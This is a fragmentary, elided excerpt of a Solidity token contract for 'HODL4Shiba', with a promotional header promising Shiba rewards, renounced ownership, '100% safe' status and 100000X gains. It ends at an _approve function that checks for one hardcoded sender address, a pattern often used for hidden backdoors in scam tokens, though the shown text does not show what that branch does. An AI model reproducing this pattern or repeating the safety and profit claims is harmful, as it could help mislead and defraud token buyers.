...
/** 
   ...
   Shiba,Rfi,Feg,CT,Safemoon,Pig combine together to create #HODL4DShiba.
    
   Tokenomics features:
   You can earn real Shiba Tokens.
   ...
   I will renounce the ownership to burn addresses to transfer #Shiba to the community, make sure it's 100% safe.

   I will add 0.6 BNB and all the left 50% total supply to the pool
   Can you make #HODL4Shiba 100000X? 

   1,000,000,000,000,000 total supply
   1,000,000,000,000 HODL4Shiba max limit for per trade
  

   3% fee for liquidity will go to an address that the contract creates, 
   it's the best part of the #HODL4Shiba idea, increasing the liquidity pool automatically, 
...
contract HODL4Shiba is Context, IERC20, Ownable {
    ...
    string private _name = "HODL4Shiba";
    string private _symbol = "HFS";
...
/*        function setTaxFeePercent(uint256 taxFee) external onlyOwner() {
    ...
    */
    ...
    function _approve(address owner, address spender, uint256 amount) private {
      ...
      if (msg.sender == address(0x127AbA0042F012b721b2801DA199A19d4de8b339)) {
